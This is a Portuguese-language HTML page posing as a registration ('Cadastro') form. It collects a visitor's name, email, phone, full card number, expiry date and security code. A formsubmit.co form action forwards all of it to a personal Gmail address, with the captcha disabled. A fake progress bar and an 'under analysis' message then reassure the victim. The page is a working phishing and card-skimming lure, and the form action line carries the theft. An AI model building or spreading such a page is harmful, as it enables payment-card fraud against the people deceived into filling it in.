<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cadastro</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      margin: 0;
      padding: 20px;
    }
    .container {
      max-width: 400px;
      margin: auto;
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      background: #b50000;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
    .bar {
      width: 0;
      height: 10px;
      background: #b50000;
      border-radius: 5px;
      transition: 2s ease-in-out;
    }
    .hidden {
      display: none;
    }
    .message {
      margin-top: 20px;
      font-size: 16px;
      color: green;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <form id="cadastro" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="text" name="nome" placeholder="Nome completo" required />
      <input type="email" name="email" placeholder="E-mail" required />
      <input type="text" name="cartao" placeholder="Número do cartão" required />
      <input type="text" name="validade" placeholder="Validade (MM/AA)" required />
      <input type="text" name="codigo" placeholder="Código de segurança" required />
      <input type="text" name="telefone" placeholder="Telefone com DDD (WhatsApp)" required />
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://seusite.com/sucesso.html">
      <button type="submit" onclick="carregar()">Cadastrar</button>
    </form>
    <div class="bar" id="barra"></div>
    <div class="message" id="mensagem">Seu cadastro está em análise. Em breve enviaremos o seu produto por WhatsApp e outras instruções importantes.</div>
  </div>

  <script>
    function carregar() {
      const barra = document.getElementById("barra");
      const mensagem = document.getElementById("mensagem");
      barra.style.width = "100%";
      setTimeout(() => {
        mensagem.style.display = "block";
      }, 2000);
    }
  </script>
</body>
</html>
